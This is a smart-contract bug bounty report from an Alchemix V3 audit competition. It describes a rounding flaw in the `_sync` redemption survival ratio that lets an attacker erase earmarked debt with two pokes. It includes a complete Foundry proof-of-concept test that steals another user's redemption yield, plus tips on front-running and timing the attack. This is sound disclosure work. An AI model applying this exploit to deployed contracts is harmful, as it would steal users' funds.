# 56809 sc high vulnerable redemption survival ratio in sync allows theft of altokens

**Submitted on Oct 20th 2025 at 21:11:33 UTC by @hashbug for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #56809
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Intro

The `_sync` function is central to the core functions of the AlchemistV3 contract. It is used to update a CDP (collateralized debt position) to correspond to the global state.

CDPs hold information about their collateral and debt. We are mostly interested in `account.earmarked` and `account.debt` in this report.

Due to the way `survivalRatio` is computed in this function, it is possible to reset `account.earmarked` to zero while reducing `account.debt` without repayment or burning, thus freeing some of the tied up collateral. The rest of the debt can be burned using remaining synthetics since `account.earmarked` will be zero.

This erasure mechanism allows to steal some of the borrowed synthetic tokens. These tokens can then be sold or transmuted.

## Vulnerability Details

The Alchemist uses global multiplicative accumulators (called weights) where individual multiplicands are <= 1 that allow CDPs to be updated lazily when required. With regular arithmetic, the values vanish, thus the Alchemix team maintains the weights in a logarithmic domain, making the accumulators additive.

The following is an update of a weight in regular arithmetic:

```
weight = weight * (total-increment)/total
```

The following is an update of a weight in the log domain:

```
weight = weight - log_2((total-increment)/total)
```

Note, that `0 <= increment <= total` with a special case for `increment == total`. Thus, `(total-increment)/total <= 1` and the logarithm is always negative, making the weight non-decreasing over time.

When a CDP needs to be caught up with the global state, the logarithm is reversed, using an exponential, only for a delta weight, which is in most cases carefully handled not to cause vanishing values in inappropriate places.

The weights are stored in the form of survival, e.g. `_earmarkWeight` stores "whatever survives earmarking in this operation out of what has survived earmarking up until now", hence the formula:

```
weight = weight * (total-increment)/total
```

Most values in `_sync` need to be scaled inversely to this survival, thus the value is retrived as follows:

```
weightDelta = globalWeight - lastWeightSnapshot
scaledValue = value * (1 - 2^(-weightDelta))
```

This equation works because

```
2^(-weightDelta) = 2^(-(globalWeight - lastWeightSnapshot)) = 2^(-globalWeight)/2^(-lastWeightSnapshot)
```

Note, that the exponentials are the inverse of the logarithmic transform, thus the division in the last equation is a normalization of the current weight by the last weight snapshot.

This correctly brings the CDP up-to-date.

Theoretically, evaluating the exponential with the weight delta and dividing the two exponentials is equivalent. In practice, exponential division is inferior, because it makes the code vulnerable to the value vanishing problem again.

In `_sync`, we have

```
        // Redemption survival now and at last sync
        // Survival is the amount of earmark that is left after a redemption
        uint256 redemptionSurvivalOld = PositionDecay.SurvivalFromWeight(account.lastAccruedRedemptionWeight);
        if (redemptionSurvivalOld == 0) redemptionSurvivalOld = ONE_Q128;
        uint256 redemptionSurvivalNew  = PositionDecay.SurvivalFromWeight(_redemptionWeight);
        // Survival during current sync window
        uint256 survivalRatio = _divQ128(redemptionSurvivalNew, redemptionSurvivalOld);
```

Next, we will demonstrate that `redemptionSurvivalNew` suffers from the vanishing problem, leaving `survivalRatio == 0` in certain cases.

There is a special value representing `total == increment`, i.e., `(total-increment)/total == 0`, which is

```
uint256 private constant LOG2NEGFRAC_1 = 0x80000000000000000000000000000000;
```

in **PositionDecay.sol**.

This value is not only reachable through `total == increment` in one of the updates, but also over time through accumulation.

For `_redemptionWeight` we have (in `redeem`):

```
_redemptionWeight += PositionDecay.WeightIncrement(redeemedDebtTotal, cumulativeEarmarked);
```

I.e. in regular arithmetic

```
redemptionWeight = redemptionWeight * (cumulativeEarmarked - redeemedDebtTotal) / cumulativeEarmarked
```

`redeemedDebtTotal` is not insignificant compared to `cumulativeEarmarked` because earmarks are only accumulated when a redemption process is running and all earmarked debt is meant to be redeemed. The difference can be especially small in times of low volumes. Thus, over time, `_redemptionWeight` is likely to reach the threshold value `LOG2NEGFRAC_1`.

Once this happens, the `PositionDecay.SurvivalFromWeight(_redemptionWeight)` call will always return 0. This leads to `survivalRatio == 0` in each `_sync`.

## Impact Details

Once the required conditions are met, calling `_sync` on a CDP twice in a single transaction/block will result in `_accounts[tokenId].earmarked = 0` and a debt reduction for the CDP, where the first `_sync` call sets a non-zero `account.earmark` value and catches up the `_earmarkWeight` and the second `_sync` call uses this `account.earmark` value to reduce debt and then resets it to zero.

`account.debt` during the second `_sync` (simplified):

```
uint256 earmarkRaw = PositionDecay.ScaleByWeightDelta(userExposure, _earmarkWeight - account.lastAccruedEarmarkWeight); // == 0 because 2^0 == 1 and value * (1 - 1) == 0
uint256 earmarkedUnredeemed = [...] // unimportant, line below sets to 0
if (earmarkedUnredeemed > earmarkRaw) earmarkedUnredeemed = earmarkRaw;
uint256 redeemedFromEarmarked = earmarkRaw - earmarkedUnredeemed; // == 0
uint256 exposureSurvival = _mulQ128(account.earmarked, survivalRatio); // == 0 because survivalRatio == 0
uint256 redeemedTotal = (account.earmarked - exposureSurvival) + redeemedFromEarmarked; // == account.earmarked
account.debt = account.debt >= redeemedTotal ? account.debt - redeemedTotal : 0;
```

This demonstrates, that debt will be reduced by `account.earmarked` in the second `_sync` call.

`account.earmarked` is computed as follows:

```
account.earmarked = exposureSurvival + earmarkedUnredeemed;
```

From our `account.debt` analysis, we know, that both components are zero, thus `account.earmarked = 0`.

This mechanism is normally used to convert debt to earmarked debt, however, since we can set the earmarking to zero, we can effectively just reduce the account debt.

The remaining debt can be paid of with previously borrowed alTokens, since none of it is now earmarked and some alTokens will be left as a bonus - stolen, categorized as unmatured yield, even though it can be likely traded away instead of transmuting - since the debt was decreased (i.e., we don't need to use all of our borrowed tokens to repay the remaining debt).

## Caveat

When a redemption is claimed in the transmuter, some of the collateral in all CDPs will be allocated for the redemption and the next `_sync` will reflect that using `_collateralWeight`. This can be completely avoided by front-running each redemption claim with a poke-burn (double `_sync` along with burning the debt) combination. This will run the exploit on a small scale and might require high gas fees.

A better strategy might be to wait for periods when a lot of redemptions get started to open up a debt position - the more redemptions there are running, the more earmarking will be happening and the more earmarking, the more debt reduction at the exploit. Redemptions are incentivized to be closed when fully matured, thus it can be predicted when redemption claims start coming in. Each redemption claim reduces collateral, but each block earmarks more of our debt that can be then reset.

The Alchemix team expects that there will be periods with a higher propensity to borrow or buy alTokens and redeem them, specifically, when they are cheap compared to the soft peg target. During these periods, it is likely, that a lot of redemptions will be started and their claims can be somewhat predicted.

## Proof of Concept

## Proof of Concept

We will demonstrate the behavior described in the report by:

1. Preparing the initial conditions - force `survivalRatio == 0`
2. Stealing tokens as 0xdad

The PoC has been coded with clarity in mind. The real market will be a complex system that is much more complicated to simulate, but the demonstrated concepts will still apply.

The new test is derived from `AlchemistV3Test` and the main code is in `test_redeemAccountingDesync`.

The new file `PoC.t.sol`:

```
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.28;

import {IERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

import {TransparentUpgradeableProxy} from "../../lib/openzeppelin-contracts/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {SafeCast} from "../libraries/SafeCast.sol";
import {Test} from "../../lib/forge-std/src/Test.sol";
import {SafeERC20} from "../libraries/SafeERC20.sol";
import {console} from "../../lib/forge-std/src/console.sol";
import {AlchemistV3} from "../AlchemistV3.sol";
import {AlchemicTokenV3} from "../test/mocks/AlchemicTokenV3.sol";
import {Transmuter} from "../Transmuter.sol";
import {AlchemistV3Position} from "../AlchemistV3Position.sol";

import {Whitelist} from "../utils/Whitelist.sol";
import {TestERC20} from "./mocks/TestERC20.sol";
import {TestYieldToken} from "./mocks/TestYieldToken.sol";
import {TokenAdapterMock} from "./mocks/TokenAdapterMock.sol";
import {IAlchemistV3, IAlchemistV3Errors, AlchemistInitializationParams} from "../interfaces/IAlchemistV3.sol";
import {ITransmuter} from "../interfaces/ITransmuter.sol";
import {ITestYieldToken} from "../interfaces/test/ITestYieldToken.sol";
import {InsufficientAllowance} from "../base/Errors.sol";
import {Unauthorized, IllegalArgument, IllegalState, MissingInputData} from "../base/Errors.sol";
import {AlchemistNFTHelper} from "./libraries/AlchemistNFTHelper.sol";
import {IAlchemistV3Position} from "../interfaces/IAlchemistV3Position.sol";
import {AggregatorV3Interface} from "../../lib/chainlink-brownie-contracts/contracts/src/v0.8/shared/interfaces/AggregatorV3Interface.sol";
import {TokenUtils} from "../libraries/TokenUtils.sol";
import {AlchemistTokenVault} from "../AlchemistTokenVault.sol";
import {MockMYTStrategy} from "./mocks/MockMYTStrategy.sol";
import {MYTTestHelper} from "./libraries/MYTTestHelper.sol";
import {IMYTStrategy} from "../interfaces/IMYTStrategy.sol";
import {MockAlchemistAllocator} from "./mocks/MockAlchemistAllocator.sol";
import {IMockYieldToken} from "./mocks/MockYieldToken.sol";
import {IVaultV2} from "../../lib/vault-v2/src/interfaces/IVaultV2.sol";
import {VaultV2} from "../../lib/vault-v2/src/VaultV2.sol";
import {MockYieldToken} from "./mocks/MockYieldToken.sol";

contract PoCAlchemistTest is Test {
    // ----- [SETUP] Variables for setting up a minimal CDP -----

    // Callable contract variables
    AlchemistV3 alchemist;
    Transmuter transmuter;
    AlchemistV3Position alchemistNFT;
    AlchemistTokenVault alchemistFeeVault;

    // // Proxy variables
    TransparentUpgradeableProxy proxyAlchemist;
    TransparentUpgradeableProxy proxyTransmuter;

    // // Contract variables
    // CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
    AlchemistV3 alchemistLogic;
    Transmuter transmuterLogic;
    AlchemicTokenV3 alToken;
    Whitelist whitelist;

    // Parameters for AlchemicTokenV2
    string public _name;
    string public _symbol;
    uint256 public _flashFee;
    address public alOwner;

    mapping(address => bool) users;

    uint256 public constant FIXED_POINT_SCALAR = 1e18;

    uint256 public constant BPS = 10_000;

    uint256 public protocolFee = 100;

    uint256 public liquidatorFeeBPS = 300; // in BPS, 3%

    uint256 public minimumCollateralization = uint256(FIXED_POINT_SCALAR * FIXED_POINT_SCALAR) / 9e17;

    // ----- Variables for deposits & withdrawals -----

    // account funds to make deposits/test with
    uint256 accountFunds;

    // large amount to test with
    uint256 whaleSupply;

    // amount of yield/underlying token to deposit
    uint256 depositAmount;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDeposit = 1000e18;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDepositOrWithdrawalLoss = FIXED_POINT_SCALAR;

    // random EOA for testing
    address externalUser = address(0x69E8cE9bFc01AA33cD2d02Ed91c72224481Fa420);

    // another random EOA for testing
    address anotherExternalUser = address(0x420Ab24368E5bA8b727E9B8aB967073Ff9316969);

    // another random EOA for testing
    address yetAnotherExternalUser = address(0x520aB24368e5Ba8B727E9b8aB967073Ff9316961);

    // another random EOA for testing
    address someWhale = address(0x521aB24368E5Ba8b727e9b8AB967073fF9316961);

    // WETH address
    address public weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address public protocolFeeReceiver = address(10);

    // MYT variables
    VaultV2 vault;
    MockAlchemistAllocator allocator;
    MockMYTStrategy mytStrategy;
    address public operator = address(0x2222222222222222222222222222222222222222); // default operator
    address public admin = address(0x4444444444444444444444444444444444444444); // DAO OSX
    address public curator = address(0x8888888888888888888888888888888888888888);
    address public mockVaultCollateral = address(new TestERC20(100e18, uint8(18)));
    address public mockStrategyYieldToken = address(new MockYieldToken(mockVaultCollateral));
    uint256 public defaultStrategyAbsoluteCap = 2_000_000_000e18;
    uint256 public defaultStrategyRelativeCap = 1e18; // 100%

    struct CalculateLiquidationResult {
        uint256 liquidationAmountInYield;
        uint256 debtToBurn;
        uint256 outSourcedFee;
        uint256 baseFeeInYield;
    }

    struct AccountPosition {
        address user;
        uint256 collateral;
        uint256 debt;
        uint256 tokenId;
    }

    function setUp() external {
        adJustTestFunds(18);
        setUpMYT(18);
        deployCoreContracts(18);
    }

    function adJustTestFunds(uint256 alchemistUnderlyingTokenDecimals) public {
        accountFunds = 200_000 * 10 ** alchemistUnderlyingTokenDecimals;
        whaleSupply = 20_000_000_000 * 10 ** alchemistUnderlyingTokenDecimals;
        depositAmount = 200_000 * 10 ** alchemistUnderlyingTokenDecimals;
    }

    function setUpMYT(uint256 alchemistUnderlyingTokenDecimals) public {
        vm.startPrank(admin);
        uint256 TOKEN_AMOUNT = 1_000_000; // Base token amount
        uint256 initialSupply = TOKEN_AMOUNT * 10 ** alchemistUnderlyingTokenDecimals;
        mockVaultCollateral = address(new TestERC20(initialSupply, uint8(alchemistUnderlyingTokenDecimals)));
        mockStrategyYieldToken = address(new MockYieldToken(mockVaultCollateral));
        vault = MYTTestHelper._setupVault(mockVaultCollateral, admin, curator);
        mytStrategy = MYTTestHelper._setupStrategy(address(vault), mockStrategyYieldToken, admin, "MockToken", "MockTokenProtocol", IMYTStrategy.RiskClass.LOW);
        allocator = new MockAlchemistAllocator(address(vault), admin, operator);
        vm.stopPrank();
        vm.startPrank(curator);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.setIsAllocator, (address(allocator), true)));
        vault.setIsAllocator(address(allocator), true);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.addAdapter, address(mytStrategy)));
        vault.addAdapter(address(mytStrategy));
        bytes memory idData = mytStrategy.getIdData();
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.increaseAbsoluteCap, (idData, defaultStrategyAbsoluteCap)));
        vault.increaseAbsoluteCap(idData, defaultStrategyAbsoluteCap);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.increaseRelativeCap, (idData, defaultStrategyRelativeCap)));
        vault.increaseRelativeCap(idData, defaultStrategyRelativeCap);
        vm.stopPrank();
    }

    function _magicDepositToVault(address vault, address depositor, uint256 amount) internal returns (uint256) {
        deal(address(mockVaultCollateral), address(depositor), amount);
        vm.startPrank(depositor);
        TokenUtils.safeApprove(address(mockVaultCollateral), vault, amount);
        uint256 shares = IVaultV2(vault).deposit(amount, depositor);
        vm.stopPrank();
        return shares;
    }

    function _vaultSubmitAndFastForward(bytes memory data) internal {
        vault.submit(data);
        bytes4 selector = bytes4(data);
        vm.warp(block.timestamp + vault.timelock(selector));
    }

    function deployCoreContracts(uint256 alchemistUnderlyingTokenDecimals) public {
        // test maniplulation for convenience
        address caller = address(0xdead);
        address proxyOwner = address(this);
        vm.assume(caller != address(0));
        vm.assume(proxyOwner != address(0));
        vm.assume(caller != proxyOwner);
        vm.startPrank(caller);

        // Fake tokens
        alToken = new AlchemicTokenV3(_name, _symbol, _flashFee);

        ITransmuter.TransmuterInitializationParams memory transParams = ITransmuter.TransmuterInitializationParams({
            syntheticToken: address(alToken),
            feeReceiver: address(this),
            timeToTransmute: 5_256_000,
            transmutationFee: 10,
            exitFee: 20,
            graphSize: 52_560_000
        });

        // Contracts and logic contracts
        alOwner = caller;
        transmuterLogic = new Transmuter(transParams);
        alchemistLogic = new AlchemistV3();
        whitelist = new Whitelist();

        // AlchemistV3 proxy
        AlchemistInitializationParams memory params = AlchemistInitializationParams({
            admin: alOwner,
            debtToken: address(alToken),
            underlyingToken: address(vault.asset()),
            depositCap: type(uint256).max,
            minimumCollateralization: minimumCollateralization,
            collateralizationLowerBound: 1_052_631_578_950_000_000, // 1.05 collateralization
            globalMinimumCollateralization: 1_111_111_111_111_111_111, // 1.1
            transmuter: address(transmuterLogic),
            protocolFee: 0,
            protocolFeeReceiver: protocolFeeReceiver,
            liquidatorFee: liquidatorFeeBPS,
            repaymentFee: 100,
            myt: address(vault)
        });

        bytes memory alchemParams = abi.encodeWithSelector(AlchemistV3.initialize.selector, params);
        proxyAlchemist = new TransparentUpgradeableProxy(address(alchemistLogic), proxyOwner, alchemParams);
        alchemist = AlchemistV3(address(proxyAlchemist));

        // Whitelist alchemist proxy for minting tokens
        alToken.setWhitelist(address(proxyAlchemist), true);

        whitelist.add(address(0xbeef));
        whitelist.add(externalUser);
        whitelist.add(anotherExternalUser);

        transmuterLogic.setAlchemist(address(alchemist));
        transmuterLogic.setDepositCap(uint256(type(int256).max));

        alchemistNFT = new AlchemistV3Position(address(alchemist));
        alchemist.setAlchemistPositionNFT(address(alchemistNFT));

        alchemistFeeVault = new AlchemistTokenVault(address(vault.asset()), address(alchemist), alOwner);
        alchemistFeeVault.setAuthorization(address(alchemist), true);
        alchemist.setAlchemistFeeVault(address(alchemistFeeVault));

        _magicDepositToVault(address(vault), address(0xbeef), accountFunds);
        _magicDepositToVault(address(vault), address(0xdad), accountFunds);
        _magicDepositToVault(address(vault), externalUser, accountFunds);
        _magicDepositToVault(address(vault), yetAnotherExternalUser, accountFunds);
        _magicDepositToVault(address(vault), anotherExternalUser, accountFunds);
        vm.stopPrank();

        vm.startPrank(address(admin));
        allocator.allocate(address(mytStrategy), vault.convertToAssets(vault.totalSupply()));
        vm.stopPrank();

        deal(address(alToken), address(0xdad), accountFunds);
        deal(address(alToken), address(anotherExternalUser), accountFunds);
        deal(address(vault.asset()), address(0xbeef), accountFunds);
        deal(address(vault.asset()), externalUser, accountFunds);
        deal(address(vault.asset()), yetAnotherExternalUser, accountFunds);
        deal(address(vault.asset()), anotherExternalUser, accountFunds);
        deal(address(vault.asset()), alchemist.alchemistFeeVault(), 10_000 * (10 ** alchemistUnderlyingTokenDecimals));

        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(vault.asset()), address(vault), accountFunds);
        vm.stopPrank();

        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault.asset()), address(vault), accountFunds);
        vm.stopPrank();

        vm.startPrank(someWhale);
        deal(address(vault), someWhale, whaleSupply);
        deal(address(vault.asset()), someWhale, whaleSupply);
        SafeERC20.safeApprove(address(vault.asset()), address(mockStrategyYieldToken), whaleSupply);
        vm.stopPrank();
    }

    //
    // Errors used in `vm.expectRevert` in the PoC
    //

    error IllegalArgument();
    error ERC20CallFailed(address target, bool success, bytes data);

    //
    // PoC code
    //

    function test_redeemAccountingDesync() public {

        // ID tracker
        uint256 redemptionId = 0;

        // Balances used for comparison later
        uint256 preExploitBeefBalance = vault.balanceOf(address(0xbeef));
        uint256 preExploitDadBalance = vault.balanceOf(address(0xdad));

        // Constants
        uint256 claimSize = 1e18;
        uint256 claimFee = claimSize / 1000;
        uint256 claimYield = claimSize - claimFee;

        // IDs of user tokens in Alchemist
        uint256 externalTokenId = 1;
        uint256 dadTokenId = 2;
        uint256 beefTokenId = 3;

        // =============================================================
        //
        //                    EXPLOIT CONDITIONS
        // 
        // Will make `_redemptionWeight > PositionDecay.LOG2NEGFRAC_1`
        //
        // Using externalUser to keep 0xbeef and 0xdad balances intact
        //
        // These conditions are bound to happen naturally, since `_redemptionWeight`
        // is non-decreasing and changes naturally as the contracts are used
        //
        // =============================================================

        uint256 externalBalance1 = vault.balanceOf(externalUser);

        // externalUser creates a position
        _depositExternal(10e18, 0);
        _mintExternal(claimSize, externalTokenId);
        // externalUser fully completes a redemption
        _createRedemptionExternal(claimSize);

        // This is a shortcut to getting `_redemptionWeight > PositionDecay.LOG2NEGFRAC_1` since
        // `_redemptionWeight += PositionDecay.WeightIncrement(redeemedDebtTotal, cumulativeEarmarked);`
        // and `redeemedDebtTotal == cumulativeEarmarked`
        // 
        // Note, that a single user completing an entire redeem first is not required, it is just
        // convenient for seting up the PoC conditions.
        //
        // At some point, `_redemptionWeight > PositionDecay.LOG2NEGFRAC_1` will happen.
        //
        // If the volume is not large, this will happen sooner, but even large volumes will get there in the end.

        ++redemptionId;
        _transmuteExternal(redemptionId);
        
        // Withdrawing to keep a clean slate in the Alchemist, since it offers no collateral or debt getters,
        // we use the cleanness of the contract to complete our assertions and show the impact later on
        _withdrawExternal(9e18, externalTokenId);
        assertEq(vault.balanceOf(address(alchemist)), 0, "Alchemist should hold no MYT shares at this point");

        uint256 externalBalance2 = vault.balanceOf(externalUser);

        assertEq(externalBalance1 - claimFee, externalBalance2, "externalUser should only lose the claim fee");

        // =============================================================
        //
        //                       EXPLOIT SETUP
        // 
        // Will start a transmutation to accumulate earmarking
        //
        // =============================================================

        // As redemptions are created, they start accumulating earmarks, however, earmarks are more likely to
        // get redeemed only after the associated redemption process matures (per Transmuter incentives).
        // The Alchemix team expects periods of higher volumes of redemptions when the synthetic tokens are
        // cheap.
        //
        // The following exploit gives us the ability to reset an `_accounts[tokenId].earmark` to zero by
        // syncing twice in a single transaction after the conditions have been met (mostly a matter of time -
        // the Alchemix team made the design choice to transform the weights because they would tend to zero
        // otherwise).
        //
        // When a redemption claim happens, the collateral of our positions gets lowered - we want to avoid that
        // as much as possible.
        //
        // We want to start borrowing (and transmuting) in the time periods of cheap synthetics (when others
        // start their transmuting as well). Our debt will start getting earmarked. Earmarked debt is deducted
        // from actual account debt also thanks to the exploit. We reset our accumulated earmarking before we
        // expect redemption claims to come in.
        //
        // Value can be captured by our debt getting transformed into earmarked debt and those earmarks being
        // reset by the exploit before too many redemption claims come in.
        //
        // Remaining debt can be fully repaid by burning synthetics.
        //
        // Because of this gap, our collateral should be reduced only slightly compared to the growth of synthetics
        // that we actually own and do not have to burn to free up the collateral. Those excess synthetics can get
        // transmuted over time.

        // To simplify, 0xdad is the attacker, it creates debt and also starts earmarking that debt immediately.
        _depositDad(10e18, 0);
        _mintDad(1e18, dadTokenId);
        _createRedemptionDad(claimSize);
        uint256 dadId = ++redemptionId;

        // 0xbeef is a legitimate user that also starts transmuting around the same time.
        _depositBeef(10e18, 0);
        _mintBeef(claimSize, beefTokenId);
        _createRedemptionBeef(claimSize);
        uint256 beefId = ++redemptionId;

        // We fast-forward
        vm.roll(block.number + transmuterLogic.timeToTransmute());

        // =============================================================
        //
        //                          EXPLOIT
        // 
        // Will set 0xdad's `account.earmark = 0` using double-poke
        //
        // =============================================================

        // Double-poking or poking-and-burning or generally poking-and-CDPop resets earmarks for the account
        // in our conditions.
        alchemist.poke(dadTokenId);
        alchemist.poke(dadTokenId);

        // At this point we have not lost any collateral, because the timing in this PoC is just right.
        //
        // In real market conditions, some collateral would get claimed during our holding the position.
        //
        // Large redemption claims could be front-run, however, by a poke-burn-withdraw combo to avoid
        // burning collateral if some synthetics are on hand.

        // =============================================================
        //
        //                    EXPLOIT EVALUATION
        // 
        // Will claim redemptions and leave 0xdad with full collateral
        //
        // =============================================================

        _claimRedemptionBeef(beefId);
        _claimRedemptionDad(dadId);

        // At this point, 0xdad can withdraw all of the collateral it put in and it can keep the newly
        // transmuted yield tokens from its redemption claim.
        _withdrawDad(10e18, dadTokenId);

        uint256 postExploitDadBalance = vault.balanceOf(address(0xdad));
        // Note, that normally, the post-exploit balance would equal the pre-exploit balance minus fee (see setup for reference)
        assertEq(preExploitDadBalance + claimYield, postExploitDadBalance, "0xdad should receive a claim that 0xbeef paid for");

        uint256 remainingValue = vault.balanceOf(address(alchemist));
        _withdrawBeef(remainingValue, beefTokenId);

        uint256 postExploitBeefBalance = vault.balanceOf(address(0xbeef));
        assertEq(preExploitBeefBalance - claimSize - claimFee, postExploitBeefBalance, "0xbeef paid for 0xdad's claim");

        // =============================================================
        //
        //                    ADDITIONAL CONTEXT
        //
        // =============================================================

        // For reference, an empty account reverts with IllegalArgument when withdraw is called.
        vm.expectRevert(IllegalArgument.selector);
        _withdrawDad(1, dadTokenId);

        // However, the accounting is now desynced for 0xbeef after the exploit. The
        // `account.collateralBalance` was 9047619047619047619 for 0xbeef, but the balance left in the Alchemist was
        // lower, which is why the following withdrawal panics with an underflow.
        vm.expectRevert(
            abi.encodeWithSelector(
                ERC20CallFailed.selector,
                address(vault),
                false,
                // 0x11 underflow panic because the contract does not have any balance
                abi.encodeWithSignature("Panic(uint256)", 0x11)
            )
        );
        _withdrawBeef(1, beefTokenId);

        // 0xbeef could now withdraw someone else's collateral, but someone is not getting their money back.
        uint256 accountingError = 1047619047619047619; // slightly more than 1e18
        _depositExternal(accountingError, externalTokenId);
        _withdrawBeef(accountingError, beefTokenId);
    }

    //
    // Named internals, so that the PoC can be read more easily
    //

    function _depositExternal(uint256 amount, uint256 tokenId) internal {
        _deposit(externalUser, amount, tokenId);
    }

    function _mintExternal(uint256 amount, uint256 tokenId) internal {
        _mint(externalUser, amount, tokenId);
    }

    function _createRedemptionExternal(uint256 amount) internal {
        _createRedemption(externalUser, amount);
    }

    function _claimRedemptionExternal(uint256 transmutationId) internal {
        _claimRedemption(externalUser, transmutationId);
    }

    function _transmuteExternal(uint256 transmutationId) internal {
        _transmute(externalUser, transmutationId);
    }

    function _withdrawExternal(uint256 amount, uint256 tokenId) internal {
        _withdraw(externalUser, amount, tokenId);
    }

    function _depositBeef(uint256 amount, uint256 tokenId) internal {
        _deposit(address(0xbeef), amount, tokenId);
    }

    function _mintBeef(uint256 amount, uint256 tokenId) internal {
        _mint(address(0xbeef), amount, tokenId);
    }

    function _createRedemptionBeef(uint256 amount) internal {
        _createRedemption(address(0xbeef), amount);
    }

    function _claimRedemptionBeef(uint256 transmutationId) internal {
        _claimRedemption(address(0xbeef), transmutationId);
    }

    function _transmuteBeef(uint256 transmutationId) internal {
        _transmute(address(0xbeef), transmutationId);
    }

    function _withdrawBeef(uint256 amount, uint256 tokenId) internal {
        _withdraw(address(0xbeef), amount, tokenId);
    }

    function _depositDad(uint256 amount, uint256 tokenId) internal {
        _deposit(address(0xdad), amount, tokenId);
    }

    function _mintDad(uint256 amount, uint256 tokenId) internal {
        _mint(address(0xdad), amount, tokenId);
    }

    function _createRedemptionDad(uint256 amount) internal {
        _createRedemption(address(0xdad), amount);
    }

    function _claimRedemptionDad(uint256 transmutationId) internal {
        _claimRedemption(address(0xdad), transmutationId);
    }

    function _transmuteDad(uint256 transmutationId) internal {
        _transmute(address(0xdad), transmutationId);
    }

    function _withdrawDad(uint256 amount, uint256 tokenId) internal {
        _withdraw(address(0xdad), amount, tokenId);
    }

    function _deposit(address account, uint256 amount, uint256 tokenId) internal {
        vm.startPrank(account);
        console.log(vault.balanceOf(account));
        SafeERC20.safeApprove(address(vault), address(alchemist), amount);
        alchemist.deposit(amount, account, tokenId);
        vm.stopPrank();
    }

    function _mint(address account, uint256 amount, uint256 tokenId) internal {
        vm.startPrank(account);
        alchemist.mint(tokenId, amount, account);
        vm.stopPrank();
    }

    function _createRedemption(address account, uint256 amount) internal {
        vm.startPrank(account);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), amount);
        transmuterLogic.createRedemption(amount);
        vm.stopPrank();
    }

    function _claimRedemption(address account, uint256 transmutationId) internal {
        vm.prank(account);
        transmuterLogic.claimRedemption(transmutationId);
    }

    function _transmute(address account, uint256 transmutationId) internal {
        // Wait for transmutation
        vm.roll(block.number + transmuterLogic.timeToTransmute());
        // Claim
        vm.prank(account);
        transmuterLogic.claimRedemption(transmutationId);
    }

    function _withdraw(address account, uint256 amount, uint256 tokenId) internal {
        vm.prank(account);
        alchemist.withdraw(amount, account, tokenId);
    }
}
```
